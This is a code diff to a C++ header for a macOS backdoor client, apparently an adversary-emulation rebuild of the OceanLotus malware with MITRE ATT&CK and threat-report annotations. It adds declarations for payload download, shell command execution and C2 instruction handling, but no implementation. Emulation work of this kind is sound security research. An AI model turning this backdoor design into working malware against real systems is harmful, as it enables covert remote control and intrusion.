@@ -2,6 +2,7 @@
 #define ClientPP_hpp
 
 #include <chrono>
+#include <fstream>
 #include <iostream>
 #include <cstdio>
 #include <thread>
@@ -16,6 +17,7 @@
 
 namespace client {
     extern const int RESP_BUFFER_SIZE;
+    extern const std::string DOWNLOAD_FILE_NAME;
 
     /*
     executeCmd
@@ -45,6 +47,18 @@ namespace client {
             T1082 System Information Discovery
     */
     std::string getPlatformExpertDeviceValue(std::string key);
+
+    /*
+    downloadFile
+        About:
+            Helper function write payload bytes to the given path
+        Result:
+            boolean - true if write was successful, false otherwise
+        MITRE ATT&CK Techniques:
+            T1105 Ingress Tool Transfer
+    */
+    bool downloadFile(std::vector<unsigned char> payload, std::string path);
+
 }
 
 class ClientPP
@@ -105,12 +119,14 @@ public:
             void - no return value, just performs backdoor capabilities
         MITRE ATT&CK Techniques:
             T1071.001 Application Layer Protocol: Web Protocols
+            T1105 Ingress Tool Transfer
+            T1059.004 Command and Scripting Interpreter: Unix Shell
         CTI:
             https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
             https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
         References:
     */
-    static void runClient(int dwRandomTimeSleep, void * dylib);
+    static void runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib);
 
     /*
     createClientID
@@ -148,7 +164,7 @@ public:
             https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
         References:
     */
-    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data);
+    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction);
 
     ~ClientPP();
 
